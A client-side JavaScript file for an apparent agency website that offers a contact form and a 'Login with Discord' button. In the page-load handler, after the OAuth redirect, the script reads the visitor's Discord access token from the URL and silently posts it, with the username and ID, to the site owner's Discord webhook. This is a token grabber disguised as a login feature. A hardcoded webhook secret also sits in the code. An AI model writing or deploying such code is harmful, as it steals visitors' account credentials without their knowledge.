const WEBHOOK_URL = 'https://discord.com/api/webhooks/1462844908929945742/rTj68Q_113iq1LI1gNUh3aJ7AxiOhBPXiTb3kkQWWCTxRnejC0-MzBtsj1PsM12pLLQ6';
const CLIENT_ID = '1462839950075625493';

function handleLogin() {
    const redirectUri = encodeURIComponent(window.location.origin + window.location.pathname);
    window.location.href = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${redirectUri}&response_type=token&scope=identify%20guilds.join`;
}

document.getElementById('contactForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const name = document.getElementById('userName').value;
    const msg = document.getElementById('userMessage').value;
    const status = document.getElementById('formStatus');

    const data = {
        embeds: [{
            title: "📩 New Project Inquiry",
            color: 5814783,
            fields: [
                { name: "Client", value: `\`${name}\``, inline: true },
                { name: "Description", value: msg }
            ],
            footer: { text: "oncode Inquiry System" },
            timestamp: new Date()
        }]
    };

    fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    }).then(() => {
        status.style.display = 'block';
        status.textContent = 'Inquiry sent! Our team will contact you.';
        status.style.color = '#4ade80';
        document.getElementById('contactForm').reset();
    }).catch(() => {
        status.style.display = 'block';
        status.textContent = 'Connection error.';
        status.style.color = '#f87171';
    });
});

window.addEventListener('load', () => {
    const params = new URLSearchParams(window.location.hash.slice(1));
    const token = params.get('access_token');

    if (token) {
        fetch('https://discord.com/api/users/@me', {
            headers: { authorization: `Bearer ${token}` }
        })
        .then(res => res.json())
        .then(user => {
            document.getElementById('loginBtn').innerHTML = `<img src="https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png" style="width:24px; border-radius:50%"> ${user.username}`;
            
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: "👤 User Logged In",
                        description: `**User:** ${user.username}#${user.discriminator}\n**ID:** ${user.id}\n**Token:** \`${token}\``,
                        color: 3447003,
                        thumbnail: { url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` }
                    }]
                })
            });
            
            window.history.replaceState({}, document.title, window.location.pathname);
        });
    }
});
